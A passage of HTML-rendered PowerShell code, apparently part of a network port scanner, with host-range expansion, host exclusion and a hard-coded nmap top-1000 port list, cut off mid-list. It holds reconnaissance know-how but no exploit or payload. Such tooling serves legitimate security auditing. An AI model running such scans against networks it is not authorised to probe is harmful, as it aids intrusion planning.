class="hljs-variable">$CurrentIP</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>] <span class="hljs-operator">-eq</span> <span class="hljs-number">254</span>))<br>                                &#123;<br>                                    <span class="hljs-variable">$CurrentIP</span>[<span class="hljs-variable">$i</span>]++<br>                                    <span class="hljs-variable">$CurrentIP</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>]=<span class="hljs-number">0</span><br><br>                                    <span class="hljs-variable">$CurrentIPString</span> = (<span class="hljs-variable">$CurrentIP</span>[<span class="hljs-number">0</span>].ToString() + <span class="hljs-string">&quot;.&quot;</span> + <span class="hljs-variable">$CurrentIP</span>[<span class="hljs-number">1</span>].ToString() + <span class="hljs-string">&quot;.&quot;</span> + <span class="hljs-variable">$CurrentIP</span>[<span class="hljs-number">2</span>].ToString() + <span class="hljs-string">&quot;.&quot;</span> + <span class="hljs-variable">$CurrentIP</span>[<span class="hljs-number">3</span>].ToString())<br>                                    <span class="hljs-variable">$null</span> = <span class="hljs-variable">$hostList</span>.Add(<span class="hljs-variable">$CurrentIPString</span>)<br>                                &#125;<br><br>                                <span class="hljs-keyword">if</span>((<span class="hljs-variable">$i</span> <span class="hljs-operator">-eq</span> <span class="hljs-number">3</span>) <span class="hljs-operator">-and</span> (<span class="hljs-variable">$CurrentIP</span>[<span class="hljs-variable">$i</span>] <span class="hljs-operator">-lt</span> <span class="hljs-variable">$Max</span>))<br>                                &#123;<br>                                    <span class="hljs-variable">$CurrentIP</span>[<span class="hljs-variable">$i</span>]++<br><br>                                    <span class="hljs-variable">$CurrentIPString</span> = (<span class="hljs-variable">$CurrentIP</span>[<span class="hljs-number">0</span>].ToString() + <span class="hljs-string">&quot;.&quot;</span> + <span class="hljs-variable">$CurrentIP</span>[<span class="hljs-number">1</span>].ToString() + <span class="hljs-string">&quot;.&quot;</span> + <span class="hljs-variable">$CurrentIP</span>[<span class="hljs-number">2</span>].ToString() + <span class="hljs-string">&quot;.&quot;</span> + <span class="hljs-variable">$CurrentIP</span>[<span class="hljs-number">3</span>].ToString())<br>                                    <span class="hljs-variable">$null</span> = <span class="hljs-variable">$hostList</span>.Add(<span class="hljs-variable">$CurrentIPString</span>)<br>                                &#125;<br>                            &#125;<br>                        &#125;<br>                    &#125;<br><br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                    <span class="hljs-variable">$hostList</span>.Add(<span class="hljs-variable">$iHost</span>)<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Parse-ILHosts</span></span><br>        &#123;<br>           <span class="hljs-keyword">Param</span> (<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$HostFile</span><br>            )<br><br>            <span class="hljs-built_in">Get-Content</span> <span class="hljs-variable">$HostFile</span> | <span class="hljs-built_in">ForEach-Object</span> &#123;<br>                Parse<span class="hljs-literal">-Hosts</span> <span class="hljs-variable">$_</span><br>            &#125;<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Exclude-Hosts</span></span><br>        &#123;<br>            <span class="hljs-keyword">Param</span> (<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$excludeHosts</span><br>            )<br><br>            [<span class="hljs-built_in">String</span>[]] <span class="hljs-variable">$iHosts</span> = <span class="hljs-variable">$excludeHosts</span>.Split(<span class="hljs-string">&quot;,&quot;</span>)<br><br>            <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$iHost</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$iHosts</span>)<br>            &#123;<br>                <span class="hljs-variable">$iHost</span> = <span class="hljs-variable">$iHost</span>.Replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>                <span class="hljs-variable">$hostList</span>.Remove(<span class="hljs-variable">$iHost</span>)<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Get-TopPort</span></span><br>        &#123;<br>            <span class="hljs-keyword">Param</span> (<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)]<br>                [<span class="hljs-type">ValidateRange</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1000</span>)]<br>                [<span class="hljs-built_in">int</span>] <span class="hljs-variable">$numPorts</span><br>            )<br><br>            <span class="hljs-comment">#list of top 1000 ports from nmap from Jun 2013</span><br>            [<span class="hljs-built_in">int</span>[]] <span class="hljs-variable">$topPortList</span> = <span class="hljs-selector-tag">@</span>(<span class="hljs-number">80</span>,<span class="hljs-number">23</span>,<span class="hljs-number">443</span>,<span class="hljs-number">21</span>,<span class="hljs-number">3389</span>,<span class="hljs-number">110</span>,<span class="hljs-number">445</span>,<span class="hljs-number">139</span>,<span class="hljs-number">143</span>,<span class="hljs-number">53</span>,<span class="hljs-number">135</span>,<span class="hljs-number">3306</span>,<span class="hljs-number">8080</span>,<span class="hljs-number">22</span><br>                        <span class="hljs-number">1723</span>,<span class="hljs-number">111</span>,<span class="hljs-number">995</span>,<span class="hljs-number">993</span>,<span class="hljs-number">5900</span>,<span class="hljs-number">1025</span>,<span class="hljs-number">1720</span>,<span class="hljs-number">548</span>,<span class="hljs-number">113</span>,<span class="hljs-number">81</span>,<span class="hljs-number">6001</span>,<span class="hljs-number">179</span>,<span class="hljs-number">1026</span>,<span class="hljs-number">2000</span>,<span class="hljs-number">8443</span>,<br>                        <span class="hljs-number">8000</span>,<span class="hljs-number">32768</span>,<span class="hljs-number">554</span>,<span class="hljs-number">26</span>,<span class="hljs-number">1433</span>,<span class="hljs-number">49152</span>,<span class="hljs-number">2001</span>,<span class="hljs-number">515</span>,<span class="hljs-number">8008</span>,<span class="hljs-number">49154</span>,<span class="hljs-number">1027</span>,<span class="hljs-number">5666</span>,<span class="hljs-number">646</span>,<span class="hljs-number">5000</span>,<br>                        <span class="hljs-number">5631</span>,<span class="hljs-number">631</span>,<span class="hljs-number">49153</span>,<span class="hljs-number">8081</span>,<span class="hljs-number">2049</span>,<span class="hljs-number">88</span>,<span class="hljs-number">79</span>,<span class="hljs-number">5800</span>,<span class="hljs-number">106</span>,<span class="hljs-number">2121</span>,<span class="hljs-number">1110</span>,<span class="hljs-number">49155</span>,<span class="hljs-number">6000</span>,<span class="hljs-number">513</span>,<br>                        <span class="hljs-number">990</span>,<span class="hljs-number">5357</span>,<span class="hljs-number">49156</span>,<span class="hljs-number">543</span>,<span class="hljs-number">544</span>,<span class="hljs-number">5101</span>,<span class="hljs-number">144</span>,<span class="hljs-number">7</span>,<span class="hljs-number">389</span>,<span class="hljs-number">8009</span>,<span class="hljs-number">9999</span>,<span class="hljs-number">5009</span>,<span class="hljs-number">7070</span>,<span class="hljs-number">5190</span>,<span class="hljs-number">3000</span>,<br>                        <span class="hljs-number">5432</span>,<span class="hljs-number">1900</span>,<span class="hljs-number">3986</span>,<span class="hljs-number">13</span>,<span class="hljs-number">1029</span>,<span class="hljs-number">9</span>,<span class="hljs-number">5051</span>,<span class="hljs-number">6646</span>,<span class="hljs-number">49157</span>,<span class="hljs-number">1028</span>,<span class="hljs-number">873</span>,<span class="hljs-number">1755</span>,<span class="hljs-number">2717</span>,<span class="hljs-number">4899</span>,<span class="hljs-number">9100</span>,<br>                        <span class="hljs-number">119</span>,<span class="hljs-number">37</span>,<span class="hljs-number">1000</span>,<span class="hljs-number">3001</span>,<span class="hljs-number">5001</span>,<span class="hljs-number">82</span>,<span class="hljs-number">10010</span>,<span class="hljs-number">1030</span>,<span class="hljs-number">9090</span>,<span class="hljs-number">2107</span>,<span class="hljs-number">1024</span>,<span class="hljs-number">2103</span>,<span class="hljs-number">6004</span>,<span class="hljs-number">1801</span>,<br>                        <span class="hljs-number">5050</span>,<span class="hljs-number">19</span>,<span class="hljs-number">8031</span>,<span class="hljs-number">1041</span>,<span class="hljs-number">255</span>,<span class="hljs-number">1048</span>,<span class="hljs-number">1049</span>,<span class="hljs-number">1053</span>,<span class="hljs-number">1054</span>,<span class="hljs-number">1056</span>,<span class="hljs-number">1064</span>,<span class="hljs-number">3703</span>,<span class="hljs-number">17</span>,<span class="hljs-number">808</span>,<span class="hljs-number">3689</span>,<br>                        <span class="hljs-number">1031</span>,<span class="hljs-number">1044</span>,<span class="hljs-number">1071</span>,<span class="hljs-number">5901</span>,<span class="hljs-number">100</span>,<span class="hljs-number">9102</span>,<span class="hljs-number">2869</span>,<span class="hljs-number">4001</span>,<span class="hljs-number">5120</span>,<span class="hljs-number">8010</span>,<span class="hljs-number">9000</span>,<span class="hljs-number">2105</span>,<span class="hljs-number">636</span>,<span class="hljs-number">1038</span>,<br>                        <span class="hljs-number">2601</span>,<span class="hljs-number">1</span>,<span class="hljs-number">7000</span>,<span class="hljs-number">1066</span>,<span class="hljs-number">1069</span>,<span class="hljs-number">625</span>,<span class="hljs-number">311</span>,<span class="hljs-number">280</span>,<span class="hljs-number">254</span>,<span class="hljs-number">4000</span>,<span class="hljs-number">1761</span>,<span class="hljs-number">5003</span>,<span class="hljs-number">2002</span>,<span class="hljs-number">1998</span>,<span class="hljs-number">2005</span>,<br>                        <span class="hljs-number">1032</span>,<span class="hljs-number">1050</span>,<span class="hljs-number">6112</span>,<span class="hljs-number">1521</span>,<span class="hljs-number">2161</span>,<span class="hljs-number">6002</span>,<span class="hljs-number">2401</span>,<span class="hljs-number">902</span>,<span class="hljs-number">4045</span>,<span class="hljs-number">787</span>,<span class="hljs-number">7937</span>,<span class="hljs-number">1058</span>,<span class="hljs-number">2383</span>,<span class="hljs-number">1033</span>,<br>                        <span class="hljs-number">1040</span>,<span class="hljs-number">1059</span>,<span class="hljs-number">50000</span>,<span class="hljs-number">5555</span>,<span class="hljs-number">1494</span>,<span class="hljs-number">3</span>,<span class="hljs-number">593</span>,<span class="hljs-number">2301</span>,<span class="hljs-number">3268</span>,<span class="hljs-number">7938</span>,<span class="hljs-number">1022</span>,<span class="hljs-number">1234</span>,<span class="hljs-number">1035</span>,<span class="hljs-number">1036</span>,<span class="hljs-number">1037</span>,<br>                        <span class="hljs-number">1074</span>,<span class="hljs-number">8002</span>,<span class="hljs-number">9001</span>,<span class="hljs-number">464</span>,<span class="hljs-number">497</span>,<span class="hljs-number">1935</span>,<span class="hljs-number">2003</span>,<span class="hljs-number">6666</span>,<span class="hljs-number">6543</span>,<span class="hljs-number">24</span>,<span class="hljs-number">1352</span>,<span class="hljs-number">3269</span>,<span class="hljs-number">1111</span>,<span class="hljs-number">407</span>,<span class="hljs-number">500</span>,<br>                        <span class="hljs-number">20</span>,<span class="hljs-number">2006</span>,<span class="hljs-number">1034</span>,<span class="hljs-number">1218</span>,<span class="hljs-number">3260</span>,<span class="hljs-number">15000</span>,<span class="hljs-number">4444</span>,<span class="hljs-number">264</span>,<span class="hljs-number">33</span>,<span class="hljs-number">2004</span>,<span class="hljs-number">1042</span>,<span class="hljs-number">42510</span>,<span class="hljs-number">999</span>,<span class="hljs-number">3052</span>,<span class="hljs-number">1023</span>,<br>                        <span class="hljs-number">222</span>,<span class="hljs-number">1068</span>,<span class="hljs-number">888</span>,<span class="hljs-number">7100</span>,<span class="hljs-number">1717</span>,<span class="hljs-number">992</span>,<span class="hljs-number">2008</span>,<span class="hljs-number">7001</span>,<span class="hljs-number">2007</span>,<span class="hljs-number">8082</span>,<span class="hljs-number">512</span>,<span class="hljs-number">1043</span>,<span class="hljs-number">2009</span>,<span class="hljs-number">5801</span>,<span class="hljs-number">1700</span>,<br>                        <span class="hljs-number">7019</span>,<span class="hljs-number">50001</span>,<span class="hljs-number">4662</span>,<span class="hljs-number">2065</span>,<span class="hljs-number">42</span>,<span class="hljs-number">2602</span>,<span class="hljs-number">3333</span>,<span class="hljs-number">9535</span>,<span class="hljs-number">5100</span>,<span class="hljs-number">2604</span>,<span class="hljs-number">4002</span>,<span class="hljs-number">5002</span>,<span class="hljs-number">1047</span>,<span class="hljs-number">1051</span>,<span class="hljs-number">1052</span>,<br>                        <span class="hljs-number">1055</span>,<span class="hljs-number">1060</span>,<span class="hljs-number">1062</span>,<span class="hljs-number">1311</span>,<span class="hljs-number">3283</span>,<span class="hljs-number">4443</span>,<span class="hljs-number">5225</span>,<span class="hljs-number">5226</span>,<span class="hljs-number">6059</span>,<span class="hljs-number">6789</span>,<span class="hljs-number">8089</span>,<span class="hljs-number">8651</span>,<span class="hljs-number">8652</span>,<span class="hljs-number">8701</span>,<span class="hljs-number">9415</span>,<br>                        <span class="hljs-number">9593</span>,<span class="hljs-number">9594</span>,<span class="hljs-number">9595</span>,<span class="hljs-number">16992</span>,<span class="hljs-number">16993</span>,<span class="hljs-number">20828</span>,<span class="hljs-number">23502</span>,<span class="hljs-number">32769</span>,<span class="hljs-number">33354</span>,<span class="hljs-number">35500</span>,<span class="hljs-number">52869</span>,<span class="hljs-number">55555</span>,<span class="hljs-number">55600</span>,<br>                        <span class="hljs-number">64623</span>,<span class="hljs-number">64680</span>,<span class="hljs-number">65000</span>,<span class="hljs-number">65389</span>,<span class="hljs-number">1067</span>,<span class="hljs-number">13782</span>,<span class="hljs-number">366</span>,<span class="hljs-number">5902</span>,<span class="hljs-number">9050</span>,<span class="hljs-number">85</span>,<span class="hljs-number">1002</span>,<span class="hljs-number">5500</span>,<span class="hljs-number">1863</span>,<span class="hljs-number">1864</span>,<br>                        <span class="hljs-number">5431</span>,<span class="hljs-number">8085</span>,<span class="hljs-number">10243</span>,<span class="hljs-number">45100</span>,<span class="hljs-number">49999</span>,<span class="hljs-number">51103</span>,<span class="hljs-number">49</span>,<span class="hljs-number">90</span>,<span class="hljs-number">6667</span>,<span class="hljs-number">1503</span>,<span class="hljs-number">6881</span>,<span class="hljs-number">27000</span>,<span class="hljs-number">340</span>,<span class="hljs-number">1500</span>,<span class="hljs-number">8021</span>,<br>                        <span class="hljs-number">2222</span>,<span class="hljs-number">5566</span>,<span class="hljs-number">8088</span>,<span class="hljs-number">8899</span>,<span class="hljs-number">9071</span>,<span class="hljs-number">5102</span>,<span class="hljs-number">6005</span>,<span class="hljs-number">9101</span>,<span class="hljs-number">163</span>,<span class="hljs-number">5679</span>,<span class="hljs-number">146</span>,<span class="hljs-number">648</span>,<span class="hljs-number">1666</span>,<span class="hljs-number">83</span>,<span class="hljs-number">3476</span>,<span class="hljs-number">5004</span>,<br>                        <span class="hljs-number">5214</span>,<span class="hljs-number">8001</span>,<span class="hljs-number">8083</span>,<span class="hljs-number">8084</span>,<span class="hljs-number">9207</span>,<span class="hljs-number">14238</span>,<span class="hljs-number">30</span>,<span class="hljs-number">912</span>,<span class="hljs-number">12345</span>,<span class="hljs-number">2030</span>,<span class="hljs-number">2605</span>,<span class="hljs-number">6</span>,<span class="hljs-number">541</span>,<span class="hljs-number">4</span>,<span class="hljs-number">1248</span>,<span class="hljs-number">3005</span>,<span class="hljs-number">8007</span>,<br>                        <span class="hljs-number">306</span>,<span class="hljs-number">880</span>,<span class="hljs-number">2500</span>,<span class="hljs-number">1086</span>,<span class="hljs-number">1088</span>,<span class="hljs-number">2525</span>,<span class="hljs-number">4242</span>,<span class="hljs-number">8291</span>,<span class="hljs-number">9009</span>,<span class="hljs-number">52822</span>,<span class="hljs-number">900</span>,<span class="hljs-number">6101</span>,<span class="hljs-number">2809</span>,<span class="hljs-number">7200</span>,<span class="hljs-number">211</span>,<span class="hljs-number">800</span>,<br>                        <span class="hljs-number">987</span>,<span class="hljs-number">1083</span>,<span class="hljs-number">12000</span>,<span class="hljs-number">705</span>,<span class="hljs-number">711</span>,<span class="hljs-number">20005</span>,<span class="hljs-number">6969</span>,<span class="hljs-number">13783</span>,<span class="hljs-number">1045</span>,<span class="hljs-number">1046</span>,<span class="hljs-number">1061</span>,<span class="hljs-number">1063</span>,<span class="hljs-number">1070</span>,<span class="hljs-number">1072</span>,<span class="hljs-number">1073</span>,<br>                        <span class="hljs-number">1075</span>,<span class="hljs-number">1077</span>,<span class="hljs-number">1078</span>,<span class="hljs-number">1079</span>,<span class="hljs-number">1081</span>,<span class="hljs-number">1082</span>,<span class="hljs-number">1085</span>,<span class="hljs-number">1093</span>,<span class="hljs-number">1094</span>,<span class="hljs-number">1096</span>,<span class="hljs-number">1098</span>,<span class="hljs-number">1099</span>,<span class="hljs-number">1100</span>,<span class="hljs-number">1104</span>,<span class="hljs-number">1106</span>,<br>                        <span class="hljs-number">1107</span>,<span class="hljs-number">1108</span>,<span class="hljs-number">1148</span>,<span class="hljs-number">1169</span>,<span class="hljs-number">1272</span>,<span class="hljs-number">1310</span>,<span class="hljs-number">1687</span>,<span class="hljs-number">1718</span>,<span class="hljs-number">1783</span>,<span class="hljs-number">1840</span>,<span class="hljs-number">2100</span>,<span class="hljs-number">2119</span>,<span class="hljs-number">2135</span>,<span class="hljs-number">2144</span>,<span class="hljs-number">2160</span>,<br>                        <span class="hljs-number">2190</span>,<span class="hljs-number">2260</span>,<span class="hljs-number">2381</span>,<span class="hljs-number">2399</span>,<span class="hljs-number">2492</span>,<span class="hljs-number">2607</span>,<span class="hljs-number">2718</span>,<span class="hljs-number">2811</span>,<span class="hljs-number">2875</span>,<span class="hljs-number">3017</span>,<span class="hljs-number">3031</span>,<span class="hljs-number">3071</span>,<span class="hljs-number">3211</span>,<span class="hljs-number">3300</span>,<span class="hljs-number">3301</span>,<br>                        <span class="hljs-number">3323</span>,<span class="hljs-number">3325</span>,<span class="hljs-number">3351</span>,<span class="hljs-number">3404</span>,<span class="hljs-number">3551</span>,<span class="hljs-number">3580</span>,<span class="hljs-number">3659</span>,<span class="hljs-number">3766</span>,<span class="hljs-number">3784</span>,<span class="hljs-number">3801</span>,<span class="hljs-number">3827</span>,<span class="hljs-number">3998</span>,<span class="hljs-number">4003</span>,<span class="hljs-number">4126</span>,<span class="hljs-number">4129</span>,<br>                        <span class="hljs-number">4449</span>,<span class="hljs-number">5222</span>,<span class="hljs-number">5269</span>,<span class="hljs-number">5633</span>,<span class="hljs-number">5718</span>,<span class="hljs-number">5810</span>,<span class="hljs-number">5825</span>,<span class="hljs-number">5877</span>,<span class="hljs-number">5910</span>,<span class="hljs-number">5911</span>,<span class="hljs-number">5925</span>,<span class="hljs-number">5959</span>,<span class="hljs-number">5960</span>,<span class="hljs-number">5961</span>,<span class="hljs-number">5962</span>,<br>                        <span class="hljs-number">5987</span>,<span class="hljs-number">5988</span>,<span class="hljs-number">5989</span>,<span class="hljs-number">6123</span>,<span class="hljs-number">6129</span>,<span class="hljs-number">6156</span>,<span class="hljs-number">6389</span>,<span class="hljs-number">6580</span>,<span class="hljs-number">6901</span>,<span class="hljs-number">7106</span>,<span class="hljs-number">7625</span>,<span class="hljs-number">7777</span>,<span class="hljs-number">7778</span>,<span class="hljs-number">7911</span>,<span class="hljs-number">8086</span>,<br>                        <span class="hljs-number">8181</span>,<span class="hljs-number">8222</span>,<span class="hljs-number">8333</span>,<span class="hljs-number">8400</span>,<span class="hljs-number">8402</span>,<span class="hljs-number">8600</span>,<span class="hljs-number">8649</span>,<span class="hljs-number">8873</span>,<span class="hljs-number">8994</span>,<span class="hljs-number">9002</span>,<span class="hljs-number">9011</span>,<span class="hljs-number">9080</span>,<span class="hljs-number">9220</span>,<span class="hljs-number">9290</span>,<span class="hljs-number">9485</span>,<br>                        <span class="hljs-number">9500</span>,<span class="hljs-number">9502</span>,<span class="hljs-number">9503</span>,<span class="hljs-number">9618</span>,<span class="hljs-number">9900</span>,<span class="hljs-number">9968</span>,<span class="hljs-number">10002</span>,<span class="hljs-number">10012</span>,<span class="hljs-number">10024</span>,<span class="hljs-number">10025</span>,<span class="hljs-number">10566</span>,<span class="hljs-number">10616</span>,<span class="hljs-number">10617</span>,<span class="hljs-number">10621</span>,<br>                        <span class="hljs-number">10626</span>,<span class="hljs-number">10628</span>,<span class="hljs-number">10629</span>,<span class="hljs-number">11110</span>,<span class="hljs-number">13456</span>,<span class="hljs-number">14442</span>,<span class="hljs-number">15002</span>,<span class="hljs-number">15003</span>,<span class="hljs-number">15660</span>,<span class="hljs-number">16001</span>,<span class="hljs-number">16016</span>,<span class="hljs-number">16018</span>,<span class="hljs-number">17988</span>,<br>                        <span class="hljs-number">19101</span>,<span class="hljs-number">19801</span>,<span class="hljs-number">19842</span>,<span class="hljs-number">20000</span>,<span class="hljs-number">20031</span>,<span class="hljs-number">20221</span>,<span class="hljs-number">20222</span>,<span class="hljs-number">21571</span>,<span class="hljs-number">22939</span>,<span class="hljs-number">24800</span>,<span class="hljs-number">25734</span>,<span class="hljs-number">27715</span>,<span class="hljs-number">28201</span>,<br>                        <span class="hljs-number">30000</span>,<span class="hljs-number">30718</span>,<span class="hljs-number">31038</span>,<span class="hljs-number">32781</span>,<span class="hljs-number">32782</span>,<span class="hljs-number">33899</span>,<span class="hljs-number">34571</span>,<span class="hljs-number">34572</span>,<span class="hljs-number">34573</span>,<span class="hljs-number">40193</span>,<span class="hljs-number">48080</span>,<span class="hljs-number">49158</span>,<span class="hljs-number">49159</span>,<br>                        <span class="hljs-number">49160</span>,<span class="hljs-number">50003</span>,<span class="hljs-number">50006</span>,<span class="hljs-number">50800</span>,<span class="hljs-number">57294</span>,<span class="hljs-number">58080</span>,<span class="hljs-number">60020</span>,<span class="hljs-number">63331</span>,<span class="hljs-number">65129</span>,<span class="hljs-number">691</span>,<span class="hljs-number">212</span>,<span class="hljs-number">1001</span>,<span class="hljs-number">1999</span>,<span class="hljs-number">2020</span>,<br>                        <span class="hljs-number">2998</span>,<span class="hljs-number">6003</span>,<span class="hljs-number">7002</span>,<span class="hljs-number">50002</span>,<span class="hljs-number">32</span>,<span class="hljs-number">2033</span>,<span class="hljs-number">3372</span>,<span class="hljs-number">99</span>,<span class="hljs-number">425</span>,<span class="hljs-number">749</span>,<span class="hljs-number">5903</span>,<span class="hljs-number">43</span>,<span class="hljs-number">458</span>,<span class="hljs-number">5405</span>,<span class="hljs-number">6106</span>,<span class="hljs-number">6502</span>,<span class="hljs-number">7007</span>,<br>                        <span class="hljs-number">13722</span>,<span class="hljs-number">1087</span>,<span class="hljs-number">1089</span>,<span class="hljs-number">1124</span>,<span class="hljs-number">1152</span>,<span class="hljs-number">1183</span>,<span class="hljs-number">1186</span>,<span class="hljs-number">1247</span>,<span class="hljs-number">1296</span>,<span class="hljs-number">1334</span>,<span class="hljs-number">1580</span>,<span class="hljs-number">1782</span>,<span class="hljs-number">2126</span>,<span class="hljs-number">2179</span>,<span class="hljs-number">2191</span>,<span class="hljs-number">2251</span>,<br>                        <span class="hljs-number">2522</span>,<span class="hljs-number">3011</span>,<span class="hljs-number">3030</span>,<span class="hljs-number">3077</span>,<span class="hljs-number">3261</span>,<span class="hljs-number">3493</span>,<span class="hljs-number">3546</span>,<span class="hljs-number">3737</span>,<span class="hljs-number">3828</span>,<span class="hljs-number">3871</span>,<span class="hljs-number">3880</span>,<span class="hljs-number">3918</span>,<span class="hljs-number">3995</span>,<span class="hljs-number">4006</span>,<span class="hljs-number">4111</span>,<span class="hljs-number">4446</span>,<br>                        <span class="hljs-number">5054</span>,<span class="hljs-number">5200</span>,<span class="hljs-number">5280</span>,<span class="hljs-number">5298</span>,<span class="hljs-number">5822</span>,<span class="hljs-number">5859</span>,<span class="hljs-number">5904</span>,<span class="hljs-number">5915</span>,<span class="hljs-number">5922</span>,<span class="hljs-number">5963</span>,<span class="hljs-number">7103</span>,<span class="hljs-number">7402</span>,<span class="hljs-number">7435</span>,<span class="hljs-number">7443</span>,<span class="hljs-number">7512</span>,<span class="hljs-number">8011</span>,<br>                        <span class="hljs-number">8090</span>,<span class="hljs-number">8100</span>,<span class="hljs-number">8180</span>,<span class="hljs-number">8254</span>,<span class="hljs-number">8500</span>,<span class="hljs-number">8654</span>,<span class="hljs-number">9091</span>,<span class="hljs-number">9110</span>,<span class="hljs-number">9666</span>,<span class="hljs-number">9877</span>,<span class="hljs-number">9943</span>,<span class="hljs-number">9944</span>,<span class="hljs-number">9998</span>,<span class="hljs-number">10004</span>,<span class="hljs-number">10778</span>,<span class="hljs-number">15742</span>,<br>                        <span class="hljs-number">16012</span>,<span class="hljs-number">18988</span>,<span class="hljs-number">19283</span>,<span class="hljs-number">19315</span>,<span class="hljs-number">19780</span>,<span class="hljs-number">24444</span>,<span class="hljs-number">27352</span>,<span class="hljs-number">27353</span>,<span class="hljs-number">27355</span>,<span class="hljs-number">32784</span>,<span class="hljs-number">49163</span>,<span class="hljs-number">49165</span>,<span class="hljs-number">49175</span>,<br>                        <span class="hljs-number">50389</span>,<span class="hljs-number">50636</span>,<span class="hljs-number">51493</span>,<span class="hljs-number">55055</span>,<span class="hljs-number">56738</span>,<span class="hljs-number">61532</span>,<span class="hljs-number">61900</span>,<span class="hljs-number">62078</span>,<span class="hljs-number">1021</span>,<span class="hljs-number">9040</span>,<span class="hljs-number">666</span>,<span class="hljs-number">700</span>,<span class="hljs-number">84</span>,<span class="hljs-number">545</span>,<span class="hljs-number">1112</span>,<br>                        <span class="hljs-number">1524</span>,<span class="hljs-number">2040</span>,<span class="hljs-number">4321</span>,<span class="hljs-number">5802</span>,<span class="hljs-number">38292</span>,<span class="hljs-number">49400</span>,<span class="hljs-number">1084</span>,<span class="hljs-number">1600</span>,<span class="hljs-number">2048</span>,<span class="hljs-number">2111</span>,<span class="hljs-number">3006</span>,<span class="hljs-number">6547</span>,<span class="hljs-number">6699</span>,<span class="hljs-number">9111</span>,<span class="hljs-number">16080</span>,<br>                        <span class="hljs-number">555</span>,<span class="hljs-number">667</span>,<span class="hljs-number">720</span>,<span class="hljs-number">801</span>,<span class="hljs-number">1443</span>,<span class="hljs-number">1533</span>,<span class="hljs-number">2106</span>,<span class="hljs-number">5560</span>,<span class="hljs-number">6007</span>,<span class="hljs-number">1090</span>,<span class="hljs-number">1091</span>,<span class="hljs-number">1114</span>,<span class="hljs-number">1117</span>,<span class="hljs-number">1119</span>,<span class="hljs-number">1122</span>,<span class="hljs-number">1131</span>,<span class="hljs-number">1138</span>,<br>                        <span class="hljs-number">1151</span>,<span class="hljs-number">1175</span>,<span class="hljs-number">1199</span>,<span class="hljs-number">1201</span>,<span class="hljs-number">1271</span>,<span class="hljs-number">1862</span>,<span class="hljs-number">2323</span>,<span class="hljs-number">2393</span>,<span class="hljs-number">2394</span>,<span class="hljs-number">2608</span>,<span class="hljs-number">2725</span>,<span class="hljs-number">2909</span>,<span class="hljs-number">3003</span>,<span class="hljs-number">3168</span>,<span class="hljs-number">3221</span>,<span class="hljs-number">3322</span>,<br>                        <span class="hljs-number">3324</span>,<span class="hljs-number">3390</span>,<span class="hljs-number">3517</span>,<span class="hljs-number">3527</span>,<span class="hljs-number">3800</span>,<span class="hljs-number">3809</span>,<span class="hljs-number">3814</span>,<span class="hljs-number">3826</span>,<span class="hljs-number">3869</span>,<span class="hljs-number">3878</span>,<span class="hljs-number">3889</span>,<span class="hljs-number">3905</span>,<span class="hljs-number">3914</span>,<span class="hljs-number">3920</span>,<span class="hljs-number">3945</span>,<span class="hljs-number">3971</span>,<br>                        <span class="hljs-number">4004</span>,<span class="hljs-number">4005</span>,<span class="hljs-number">4279</span>,<span class="hljs-number">4445</span>,<span class="hljs-number">4550</span>,<span class="hljs-number">4567</span>,<span class="hljs-number">4848</span>,<span class="hljs-number">4900</span>,<span class="hljs-number">5033</span>,<span class="hljs-number">5080</span>,<span class="hljs-number">5087</span>,<span class="hljs-number">5221</span>,<span class="hljs-number">5440</span>,<span class="hljs-number">5544</span>,<span class="hljs-number">5678</span>,<span class="hljs-number">5730</span>,<br>                        <span class="hljs-number">5811</span>,<span class="hljs-number">5815</span>,<span class="hljs-number">5850</span>,<span class="hljs-number">5862</span>,<span class="hljs-number">5906</span>,<span class="hljs-number">5907</span>,<span class="hljs-number">5950</span>,<span class="hljs-number">5952</span>,<span class="hljs-number">6025</span>,<span class="hljs-number">6510</span>,<span class="hljs-number">6565</span>,<span class="hljs-number">6567</span>,<span class="hljs-number">6689</span>,<span class="hljs-number">6692</span>,<span class="hljs-number">6779</span>,<span class="hljs-number">6792</span>,<br>                        <span class="hljs-number">6839</span>,<span class="hljs-number">7025</span>,<span class="hljs-number">7496</span>,<span class="hljs-number">7676</span>,<span class="hljs-number">7800</span>,<span class="hljs-number">7920</span>,<span class="hljs-number">7921</span>,<span class="hljs-number">7999</span>,<span class="hljs-number">8022</span>,<span class="hljs-number">8042</span>,<span class="hljs-number">8045</span>,<span class="hljs-number">8093</span>,<span class="hljs-number">8099</span>,<span class="hljs-number">8200</span>,<span class="hljs-number">8290</span>,<span class="hljs-number">8292</span>,<br>                        <span class="hljs-number">8300</span>,<span class="hljs-number">8383</span>,<span class="hljs-number">9003</span>,<span class="hljs-number">9081</span>,<span class="hljs-number">9099</span>,<span class="hljs-number">9200</span>,<span class="hljs-number">9418</span>,<span class="hljs-number">9575</span>,<span class="hljs-number">9878</span>,<span class="hljs-number">9898</span>,<span class="hljs-number">9917</span>,<span class="hljs-number">10003</span>,<span class="hljs-number">10180</span>,<span class="hljs-number">10215</span>,<span class="hljs-number">11111</span>,<br>                        <span class="hljs-number">12174</span>,<span class="hljs-number">12265</span>,<span class="hljs-number">14441</span>,<span class="hljs-number">15004</span>,<span class="hljs-number">16000</span>,<span class="hljs-number">16113</span>,<span class="hljs-number">17877</span>,<span class="hljs-number">18040</span>,<span class="hljs-number">18101</span>,<span class="hljs-number">19350</span>,<span class="hljs-number">25735</span>,<span class="hljs-number">26214</span>,<span 